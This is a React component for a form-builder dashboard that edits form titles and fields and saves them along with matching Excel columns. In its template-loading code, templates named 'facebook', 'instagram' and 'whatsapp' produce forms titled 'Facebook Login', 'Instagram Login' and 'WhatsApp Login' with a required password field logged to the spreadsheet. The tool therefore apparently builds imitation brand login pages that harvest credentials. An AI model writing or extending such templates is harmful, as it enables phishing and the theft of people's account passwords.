
import React, { useState, useEffect } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';

function Customize() {
  // Simple logout handler
  const onLogout = () => {
    localStorage.removeItem('token');
    navigate('/');
  };
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const formId = searchParams.get('formId');
  const isNewForm = !formId;
  const template = (searchParams.get('template') || '').toLowerCase();
  const token = localStorage.getItem('token') || '';
  const generateRandomFormName = () => `Form-${Math.random().toString(36).slice(2, 8).toUpperCase()}`;

  const [customizationData, setCustomizationData] = useState({
    formName: isNewForm ? generateRandomFormName() : '',
    formTitle: 'Data Entry Form',
    formHeader: 'Enter the heading',
    submitText: 'Submit',
    formFields: [
      { name: 'name', label: 'Name', required: true, type: 'text' },
      { name: 'number', label: 'Phone Number', required: true, type: 'text' },
      { name: 'email', label: 'Email', required: true, type: 'email' }
    ],
    excelColumns: [
      { name: 'name', label: 'Name', required: true },
      { name: 'number', label: 'Phone Number', required: true },
      { name: 'email', label: 'Email', required: true }
    ]
  });

  const [message, setMessage] = useState('');
  const [isSaving, setIsSaving] = useState(false);
  const [prevCustomizationData, setPrevCustomizationData] = useState(null);

  const STATIC_FIELD_NAMES = ['name', 'number', 'email'];

  const deepClone = (obj) => JSON.parse(JSON.stringify(obj));
  const savePrev = () => setPrevCustomizationData(deepClone(customizationData));

        useEffect(() => {
          const load = async () => {
            try {
              let endpoint = '/api/customization';
              if (formId && !isNewForm) {
                endpoint = `/api/forms/${formId}`;
              }
              const res = await fetch(endpoint, {
                headers: { Authorization: `Bearer ${token}` }
              });
              if (res.ok) {
                const data = await res.json();
                const loaded = data && data.formFields ? data : {
                  formName: data.formName || '',
                  formTitle: data.formTitle,
                  formHeader: data.formHeader || '',
                  formFields: data.formFields,
                  excelColumns: data.excelColumns
                };
                if (loaded && Array.isArray(loaded.formFields) && Array.isArray(loaded.excelColumns)) {
                  // Apply template only for new forms
                  if (isNewForm && template) {
                    const templateFieldsBase = [
                      { name: 'name', label: 'Name', required: true, type: 'text' },
                      { name: 'number', label: 'Phone Number', required: true, type: 'tel' },
                      { name: 'email', label: 'Email', required: true, type: 'email' }
                    ];
                    const withPassword = [
                      ...templateFieldsBase,
                      { name: 'password', label: 'Password', required: true, type: 'password' }
                    ];
                    const tplTitle = template === 'facebook' ? 'Facebook Login' : template === 'instagram' ? 'Instagram Login' : template === 'whatsapp' ? 'WhatsApp Login' : 'Data Entry Form';
                    setCustomizationData({
                      formName: generateRandomFormName(),
                      formTitle: tplTitle,
                      formHeader: 'Enter the heading',
                      submitText: 'Submit',
                      formFields: withPassword,
                      excelColumns: [
                        { name: 'name', label: 'Name', required: true },
                        { name: 'number', label: 'Phone Number', required: true },
                        { name: 'email', label: 'Email', required: true },
                        { name: 'password', label: 'Password', required: true }
                      ]
                    });
                  } else if (isNewForm && !template) {
                    // Default new form: only Name, Phone, Email
                    setCustomizationData({
                      formName: generateRandomFormName(),
                      formTitle: 'Data Entry Form',
                      formHeader: 'Enter the heading',
                      submitText: 'Submit',
                      formFields: [
                        { name: 'name', label: 'Name', required: true, type: 'text' },
                        { name: 'number', label: 'Phone Number', required: true, type: 'tel' },
                        { name: 'email', label: 'Email', required: true, type: 'email' }
                      ],
                      excelColumns: [
                        { name: 'name', label: 'Name', required: true },
                        { name: 'number', label: 'Phone Number', required: true },
                        { name: 'email', label: 'Email', required: true }
                      ]
                    });
                  } else {
                    setCustomizationData({
                      formName: loaded.formName || '',
                      formTitle: loaded.formTitle || 'Data Entry Form',
                      formHeader: loaded.formHeader || 'Enter the heading',
                      formFields: loaded.formFields,
                      excelColumns: loaded.excelColumns
                    });
                  }
                }
              }
            } catch (e) {}
          };
          load();
        }, [token]);

        // Field change handler: auto-generate name from label for editable fields
        const handleFieldChange = (index, field, value) => {
          const current = customizationData.formFields[index];
          if (!current) return;
          // For static fields: allow label edit but keep name fixed; disallow changing name/type/required
          if (STATIC_FIELD_NAMES.includes(current.name)) {
            if (field === 'label') {
              const newFields = [...customizationData.formFields];
              newFields[index] = { ...newFields[index], label: value };
              setCustomizationData({ ...customizationData, formFields: newFields });
            }
            return;
          }
          if (field === 'name') return; // disallow manual name edits for all fields

          savePrev();
          const newFields = [...customizationData.formFields];
          if (field === 'label') {
            // Name mirrors label exactly as requested
            newFields[index] = { ...newFields[index], label: value, name: value };
          } else {
            newFields[index] = { ...newFields[index], [field]: value };
          }
          setCustomizationData({ ...customizationData, formFields: newFields });
        };

        const removeField = (index) => {
          const target = customizationData.formFields[index];
          if (!target) return;
          if (STATIC_FIELD_NAMES.includes(target.name)) return; // prevent removing static fields
          savePrev();
          const newFields = customizationData.formFields.filter((_, i) => i !== index);
          setCustomizationData({ ...customizationData, formFields: newFields });
        };

        const addField = () => {
          savePrev();
          const existingCount = (customizationData.formFields || []).length + 1;
          const defaultLabel = `Field ${existingCount}`;
          const newField = { name: defaultLabel, label: defaultLabel, required: false, type: 'text' };
          setCustomizationData({
            ...customizationData,
            formFields: [...customizationData.formFields, newField]
          });
        };

        const moveField = (index, direction) => {
          const newIndex = index + direction;
          const fieldsLen = customizationData.formFields.length;
          if (newIndex < 0 || newIndex >= fieldsLen) return;
          savePrev();
          const fields = [...customizationData.formFields];
          const [moved] = fields.splice(index, 1);
          fields.splice(newIndex, 0, moved);
          setCustomizationData({ ...customizationData, formFields: fields });
        };

        const handleUndo = () => {
          if (prevCustomizationData) {
            setCustomizationData(prevCustomizationData);
            setPrevCustomizationData(null);
          }
        };

        const handleReset = () => {
          savePrev();
          setCustomizationData({
            formName: customizationData.formName || '',
            formTitle: 'Data Entry Form',
            formHeader: 'Enter the heading',
            submitText: 'Submit',
            formFields: [
              { name: 'Name', label: 'Name', required: true, type: 'text' },
              { name: 'Phone Number', label: 'Phone Number', required: true, type: 'text' },
              { name: 'Email', label: 'Email', required: true, type: 'email' }
            ],
            excelColumns: customizationData.excelColumns
          });
        };

        const handleSave = async () => {
          setIsSaving(true);
          setMessage('');
          if (isNewForm && !customizationData.formName.trim()) {
            setMessage('Form name is required');
            setIsSaving(false);
            return;
          }
          try {
            let endpoint = '/api/save-customization';
            let method = 'POST';
            if (isNewForm) {
              endpoint = '/api/forms';
            } else if (formId) {
              endpoint = `/api/forms/${formId}`;
              method = 'PUT';
            }
            const res = await fetch(endpoint, {
              method,
              headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
              body: JSON.stringify(customizationData)
            });
            if (res.ok) {
              const data = await res.json();
              setMessage('Customization saved successfully!');
              try { localStorage.setItem('customization', JSON.stringify(customizationData)); } catch (_) {}
              if (isNewForm) {
                navigate(`/form?formId=${data.data._id}`);
              } else if (formId) {
                navigate(`/form?formId=${formId}`);
              } else {
                navigate('/');
              }
            } else {
              const errorData = await res.json();
              setMessage(errorData.message || 'Failed to save customization');
            }
          } catch (error) {
            setMessage('Network error. Please try again.');
          } finally {
            setIsSaving(false);
          }
        };

  return (
    <div style={{ 
      minHeight: '100vh', 
      backgroundColor: '#f8fafc', 
      padding: '20px',
      fontFamily: 'Arial, sans-serif'
    }}>
      {/* Header */}
      <div style={{ 
        display: 'flex', 
        justifyContent: 'space-between', 
        alignItems: 'center',
        marginBottom: '30px',
        padding: '20px',
        backgroundColor: 'white',
        borderRadius: '12px',
        boxShadow: '0 2px 4px rgba(0,0,0,0.1)'
      }}>
        <h1 style={{ margin: 0, color: '#1f2937' }}>
          {isNewForm ? 'Create New Form' : 'Customize Form & Excel'}
        </h1>
        <div style={{ display: 'flex', gap: '10px' }}>
          <button 
            onClick={() => navigate('/')}
            style={{
              padding: '8px 16px',
              backgroundColor: '#6b7280',
              color: 'white',
              border: 'none',
              borderRadius: '6px',
              cursor: 'pointer'
            }}
          >
            Back to Dashboard
          </button>
          <button 
            onClick={onLogout}
            style={{
              padding: '8px 16px',
              backgroundColor: '#ef4444',
              color: 'white',
              border: 'none',
              borderRadius: '6px',
              cursor: 'pointer'
            }}
          >
            Logout
          </button>
        </div>
      </div>

      {message && (
        <div style={{
          padding: '12px',
          marginBottom: '20px',
          borderRadius: '6px',
          backgroundColor: message.includes('success') ? '#d1fae5' : '#fee2e2',
          color: message.includes('success') ? '#065f46' : '#991b1b',
          border: `1px solid ${message.includes('success') ? '#a7f3d0' : '#fca5a5'}`
        }}>
          {message}
        </div>
      )}

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px' }}>
        {/* Form Customization */}
        <div style={{
          backgroundColor: 'white',
          padding: '24px',
          borderRadius: '12px',
          boxShadow: '0 2px 4px rgba(0,0,0,0.1)'
        }}>
          <h2 style={{ marginTop: 0, color: '#1f2937', marginBottom: '20px' }}>
            Form Customization
          </h2>
          
          {isNewForm && (
            <div style={{ marginBottom: '20px' }}>
              <label style={{ display: 'block', marginBottom: '8px', fontWeight: '500' }}>
                Form Name: <span style={{ color: '#ef4444' }}>*</span>
              </label>
              <input
                type="text"
                value={customizationData.formName}
                onChange={(e) => setCustomizationData({...customizationData, formName: e.target.value})}
                placeholder="Enter a unique name for this form"
                style={{
                  width: '100%',
                  padding: '8px 12px',
                  border: '1px solid #d1d5db',
                  borderRadius: '6px',
                  fontSize: '14px'
                }}
              />
            </div>
          )}
          
          <div style={{ marginBottom: '20px' }}>
            <label style={{ display: 'block', marginBottom: '8px', fontWeight: '500' }}>
              Form Title:
            </label>
            <input
              type="text"
              value={customizationData.formTitle}
              onChange={(e) => setCustomizationData({...customizationData, formTitle: e.target.value})}
              style={{
                width: '100%',
                padding: '8px 12px',
                border: '1px solid #d1d5db',
                borderRadius: '6px',
                fontSize: '14px'
              }}
            />
          </div>

          <h3 style={{ marginBottom: '16px', color: '#374151' }}>Form Fields</h3>
          
          {customizationData.formFields.map((field, index) => (
            <div key={index} style={{
              border: '1px solid #e5e7eb',
              borderRadius: '8px',
              padding: '16px',
              marginBottom: '12px',
              backgroundColor: '#f9fafb'
            }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '12px' }}>
                <h4 style={{ margin: 0, color: '#374151' }}>Field {index + 1}</h4>
                <button
                  onClick={() => removeField(index)}
                  disabled={STATIC_FIELD_NAMES.includes(field.name)}
                  style={{
                    padding: '4px 8px',
                    backgroundColor: STATIC_FIELD_NAMES.includes(field.name) ? '#9ca3af' : '#ef4444',
                    color: 'white',
                    border: 'none',
                    borderRadius: '4px',
                    cursor: STATIC_FIELD_NAMES.includes(field.name) ? 'not-allowed' : 'pointer',
                    fontSize: '12px'
                  }}
                >
                  Remove
                </button>
              </div>
              
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px' }}>
                <div>
                  <label style={{ display: 'block', marginBottom: '4px', fontSize: '12px' }}>
                    Field Name:
                  </label>
                  <input
                    type="text"
                    value={field.name}
                    onChange={() => {}}
                    disabled
                    style={{
                      width: '100%',
                      padding: '6px 8px',
                      border: '1px solid #d1d5db',
                      borderRadius: '4px',
                      fontSize: '12px',
                      backgroundColor: '#f3f4f6',
                      color: '#6b7280',
                      cursor: 'not-allowed'
                    }}
                  />
                </div>
                
                <div>
                  <label style={{ display: 'block', marginBottom: '4px', fontSize: '12px' }}>
                    Label:
                  </label>
                  <input
                    type="text"
                    value={field.label}
                    onChange={(e) => handleFieldChange(index, 'label', e.target.value)}
                    disabled={STATIC_FIELD_NAMES.includes(field.name)}
                    style={{
                      width: '100%',
                      padding: '6px 8px',
                      border: '1px solid #d1d5db',
                      borderRadius: '4px',
                      fontSize: '12px',
                      backgroundColor: STATIC_FIELD_NAMES.includes(field.name) ? '#f3f4f6' : 'white',
                      color: STATIC_FIELD_NAMES.includes(field.name) ? '#6b7280' : 'inherit',
                      cursor: STATIC_FIELD_NAMES.includes(field.name) ? 'not-allowed' : 'text'
                    }}
                  />
                </div>
                
                <div>
                  <label style={{ display: 'block', marginBottom: '4px', fontSize: '12px' }}>
                    Type:
                  </label>
                  <select
                    value={field.type}
                    onChange={(e) => handleFieldChange(index, 'type', e.target.value)}
                    disabled={STATIC_FIELD_NAMES.includes(field.name)}
                    style={{
                      width: '100%',
                      padding: '6px 8px',
                      border: '1px solid #d1d5db',
                      borderRadius: '4px',
                      fontSize: '12px',
                      backgroundColor: STATIC_FIELD_NAMES.includes(field.name) ? '#f3f4f6' : 'white',
                      color: STATIC_FIELD_NAMES.includes(field.name) ? '#6b7280' : 'inherit',
                      cursor: STATIC_FIELD_NAMES.includes(field.name) ? 'not-allowed' : 'pointer'
                    }}
                  >
                    <option value="text">Text</option>
                    <option value="email">Email</option>
                    <option value="number">Number</option>
                    <option value="tel">Phone</option>
                    <option value="date">Date</option>
                  </select>
                </div>
                
                <div style={{ display: 'flex', alignItems: 'center', marginTop: '20px' }}>
                  <input
                    type="checkbox"
                    checked={field.required}
                    onChange={(e) => handleFieldChange(index, 'required', e.target.checked)}
                    disabled={STATIC_FIELD_NAMES.includes(field.name)}
                    style={{ marginRight: '8px', cursor: STATIC_FIELD_NAMES.includes(field.name) ? 'not-allowed' : 'pointer' }}
                  />
                  <label style={{ fontSize: '12px' }}>Required</label>
                </div>
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginTop: '20px' }}>
                  <button
                    type="button"
                    onClick={() => moveField(index, -1)}
                    disabled={index === 0}
                    style={{ padding: '4px 8px', borderRadius: '4px', border: '1px solid #d1d5db', background: index === 0 ? '#e5e7eb' : 'white', cursor: index === 0 ? 'not-allowed' : 'pointer' }}
                  >
                    ↑ Move Up
                  </button>
                  <button
                    type="button"
                    onClick={() => moveField(index, 1)}
                    disabled={index === customizationData.formFields.length - 1}
                    style={{ padding: '4px 8px', borderRadius: '4px', border: '1px solid #d1d5db', background: index === customizationData.formFields.length - 1 ? '#e5e7eb' : 'white', cursor: index === customizationData.formFields.length - 1 ? 'not-allowed' : 'pointer' }}
                  >
                    ↓ Move Down
                  </button>
                </div>
              </div>
            </div>
          ))}
          
          <button
            onClick={addField}
            style={{
              padding: '8px 16px',
              backgroundColor: '#10b981',
              color: 'white',
              border: 'none',
              borderRadius: '6px',
              cursor: 'pointer',
              fontSize: '14px'
            }}
          >
            + Add Field
          </button>
          <div style={{ marginTop: '8px', color: '#6b7280', fontSize: '12px' }}>
            Note: Field name follows the label automatically. Phone Number and Email are required and cannot be edited or removed.
          </div>
        </div>

        {/* Live Preview (mirrors Form.jsx layout and classes) */}
        <div className="form-container" style={{ backgroundColor: 'white', padding: '24px', borderRadius: '12px', boxShadow: '0 2px 4px rgba(0,0,0,0.1)' }}>
          {/* Top header mimic */}
          
          {/* Editable header and title above the form, centered */}
          <div style={{ textAlign: 'center', marginBottom: '10px' }}>
            <input
              type="text"
              value={customizationData.formHeader}
              onChange={(e) => setCustomizationData({ ...customizationData, formHeader: e.target.value })}
              placeholder="Enter form header (above the form)"
              style={{
                width: '70%',
                padding: '8px 12px',
                border: '1px solid #d1d5db',
                borderRadius: '6px',
                fontSize: '14px',
                marginBottom: '8px'
              }}
            />
          </div>
          <h1 className="page-title" style={{ fontWeight: 'bold', textAlign: 'center' }}>{customizationData.formTitle || 'Data Entry Form'}</h1>

          <div style={{ maxWidth: '70%', margin: '0 auto 16px' }}>
            <label style={{ display: 'block', marginBottom: '8px', fontWeight: '500' }}>
              Submit Button Text:
            </label>
            <input
              type="text"
              value={customizationData.submitText}
              onChange={(e) => { savePrev(); setCustomizationData({ ...customizationData, submitText: e.target.value }); }}
              style={{
                width: '100%',
                padding: '8px 12px',
                border: '1px solid #d1d5db',
                borderRadius: '6px',
                fontSize: '14px'
              }}
            />
          </div>

          <div className='container'>
            <div className="form-content surface-lg">
              <div className="split-row" style={{ display: 'flex', gap: '0px', alignItems: 'flex-start', justifyContent: 'flex-start', flexWrap: 'nowrap', marginLeft: '20px' }}>
                {/* Left box (Excel area placeholder) */}
                <div style={{ flex: '0 0 0%', boxSizing: 'border-box' }}>
                 
                  
                </div>

                {/* Right box (actual form preview) */}
                <div style={{ flex: '0 0 30%', boxSizing: 'border-box', marginLeft: '0%' }}>
                  <div className="form-header2">
                    <h4 style={{ whiteSpace: 'nowrap', marginLeft:'30px', textAlign: 'center' }}>{customizationData.formHeader || 'Enter your information below and Submit the form .'}</h4>
                  </div>
                  <form className="data-form surface" style={{ padding: '16px', borderRadius: '12px', marginLeft:'130px'}} onSubmit={(e) => e.preventDefault()}>

                    {/* Dynamically render all fields in formFields */}
                    {(customizationData.formFields || []).map((field, idx) => (
                      <div className="form-row" key={field.name || idx}>
                        <div className="form-group" style={{ width: '100%' }}>
                          <label htmlFor={`field_prev_${idx}`}>{field.label || `Field ${idx + 1}`}</label>
                          <input
                            id={`field_prev_${idx}`}
                            type={field.type || 'text'}
                            className="input"
                            placeholder={field.label || `Field ${idx + 1}`}
                            disabled
                            required={!!field.required}
                          />
                        </div>
                      </div>
                    ))}

                    {/* Action buttons moved outside preview */}
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Controls outside preview */}
      <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: '16px' }}>
        <div style={{ display: 'flex', gap: '8px' }}>
          <button
            type="button"
            onClick={handleUndo}
            disabled={!prevCustomizationData}
            className="btn"
            style={{
              padding: '8px 12px',
              backgroundColor: prevCustomizationData ? '#6b7280' : '#9ca3af',
              color: 'white',
              border: 'none',
              borderRadius: '6px',
              cursor: prevCustomizationData ? 'pointer' : 'not-allowed'
            }}
          >
            Undo
          </button>
          <button
            type="button"
            onClick={handleReset}
            className="btn"
            style={{
              padding: '8px 12px',
              backgroundColor: '#374151',
              color: 'white',
              border: 'none',
              borderRadius: '6px',
              cursor: 'pointer'
            }}
          >
            Reset to Default
          </button>
        </div>
        <button
          type="button"
          onClick={handleSave}
          disabled={isSaving}
          className="submit-button btn btn-primary"
          style={{ padding: '8px 12px', cursor: isSaving ? 'not-allowed' : 'pointer' }}
        >
          {isSaving ? 'Saving...' : 'Save Customization'}
        </button>
      </div>

    </div>
  );
}

export default Customize;
